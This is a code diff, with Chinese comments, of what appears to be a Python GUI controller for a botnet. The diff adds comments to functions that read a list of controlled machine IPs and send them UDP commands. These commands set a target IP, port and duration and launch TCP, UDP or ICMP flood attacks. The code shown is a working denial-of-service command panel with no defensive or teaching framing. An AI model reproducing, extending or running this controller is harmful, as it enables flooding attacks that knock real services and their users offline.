@@ -11,7 +11,7 @@ class msg:   #設定prefix訊息標籤
     success = F"{LIV.Color.GREEN}[成功]{LIV.Color.RESET}"
     fail = F"{LIV.Color.RED}[錯誤]{LIV.Color.RESET}"
 
-def attack_test_show():
+def attack_test_show(): #使視窗顯示"攻擊測試"的介面
     controlled_enter_button.place_forget()
     connect_controlled_test_button.place_forget()
 
@@ -36,7 +36,7 @@ def attack_test_show():
 
     attack_mode_combobox.place(x=700, y=100, width=200, height=50)
 
-def connect_test_show():
+def connect_test_show(): #使視窗顯示"連接測試"介面
     attack_button.place_forget()
 
     attack_ip_entry.place_forget()
@@ -61,8 +61,8 @@ def connect_test_show():
     list_frame.place(relx=0.5, rely=0.2,relwidth=0.4, relheight=0.4)
     scrollbar.place(in_=list_frame, relx=1.0, relheight=1.0, bordermode="outside")
 
-def send_commands(code,parameter):
-    controlled_ip = open('controlled_IP_list.txt','r',encoding='utf-8')
+def send_commands(code,parameter): #發送相關指令
+    controlled_ip = open('controlled_IP_list.txt','r',encoding='utf-8') #讀取IP列表
     if code == "code00": ##更改攻擊IP
         for IPt in controlled_ip.readlines():
             control.sendto(F"code00{parameter}".encode(),(IPt[:-1],10))
@@ -71,7 +71,7 @@ def send_commands(code,parameter):
         for IPt in controlled_ip.readlines():
             control.sendto(F"code01{parameter}".encode(),(IPt[:-1],10))
             print(F"{msg.success}{LIV.Color.YELLOW}{IPt}{LIV.Color.RESET}已發送指令:{code}")
-    elif code == "code02": ##發動ICMP攻擊
+    elif code == "code02": ##發動TCP/UDP/ICMP攻擊
         for IPt in controlled_ip.readlines():
             control.sendto(F"code02{parameter}".encode(),(IPt[:-1],10))
             print(F"{msg.success}{LIV.Color.YELLOW}{IPt}{LIV.Color.RESET}已發送指令:{code}")
@@ -82,12 +82,14 @@ def send_commands(code,parameter):
     controlled_ip.close
 
 def attack():
+    #取得textbox中的參數-------------------
     attack_ip = attack_ip_entry.get()
     attack_port = attack_port_entry.get()
     attack_time = attack_time_entry.get()
     attack_mode =attack_mode_combobox.get()
+    #-------------------------------------
 
-    if attack_ip == "" or attack_port == "" or attack_time == "" or attack_mode == "":
+    if attack_ip == "" or attack_port == "" or attack_time == "" or attack_mode == "": #檢查參數是否齊全
         print(F"{msg.fail}參數未齊全")
         return
     
@@ -104,7 +106,7 @@ def attack():
     elif str(attack_mode) == "UDP flood":
         send_commands(code="code02", parameter="UDP")
 
-def controlled_ip_insert():
+def controlled_ip_insert(): #新增控制IP至列表中
     controlled_ip = (controlled_ip_entry.get())
     file = open('controlled_IP_list.txt','r')
     for findip in file:
@@ -116,7 +118,7 @@ def controlled_ip_insert():
     file.writelines(F"{controlled_ip}\n")
     file.close
 
-def delete_selected_item(xl):
+def delete_selected_item(xl):#刪除列表中的IP
     selected_item = controlled_ip_list.curselection()
     x =controlled_ip_list.get(selected_item)
     controlled_ip_list.delete(selected_item)
@@ -131,7 +133,7 @@ def delete_selected_item(xl):
     file.write(new_list)
     file.close
 
-def connect_test():
+def connect_test():#連接測試
     global control
     with open("controlled_IP_list.txt", "w") as f:
         for item in controlled_ip_list.get(0, "end"):
